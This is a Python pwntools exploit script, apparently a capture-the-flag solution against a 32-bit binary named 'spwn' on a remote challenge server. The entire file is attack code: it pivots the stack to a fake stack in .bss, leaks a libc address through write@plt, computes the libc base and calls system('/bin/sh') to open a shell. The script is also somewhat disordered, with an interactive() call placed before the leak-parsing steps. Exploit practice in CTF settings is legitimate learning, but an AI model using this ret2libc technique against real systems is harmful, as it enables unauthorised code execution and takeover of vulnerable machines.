from pwn import *

r =  remote('node3.buuoj.cn',29463)
libc = ELF('./libc-2.23.so')
#r = process('./spwn')

elf = ELF('./spwn')

shellcode = shellcraft.sh()
leave = 0x08048408

main = 0x8048513

s = 0x804A300
fake_stack = 0x804A340

r.recvuntil('What is your name?')
payload = p32(main)*16+p32(fake_stack)+p32(main)
r.sendline(payload)

bss = elf.bss()

payload = 'a'*0x18+p32(fake_stack)+p32(leave)



print(hex(libc.sym['__libc_start_main']))
print(hex(libc.sym['system']))
r.recvuntil('What do you want to say?')

r.send(payload)
payload = 'a'*0x28+p32(fake_stack)+p32(elf.plt['write'])+p32(main)+p32(1)+p32(elf.got['__libc_start_main'])+p32(4)
#+p32(elf.plt['puts'])+p32(main)+p32(elf.got['puts'])
r.sendline(payload)
#ctrl+c
r.interactive()
r.sendline('wdnmd')
leak = u32(r.recvuntil('Hello good Ctfer!',drop=True))
libc_base = leak - libc.sym['__libc_start_main']
log.success(hex(libc_base))
system = libc_base+0x3a940
log.info(hex(system))
payload = 'a'*0x18+p32(fake_stack)+p32(system)+p32(main)+p32(s)
r.sendline(payload)
r.sendline('/bin/sh')
r.interactive()
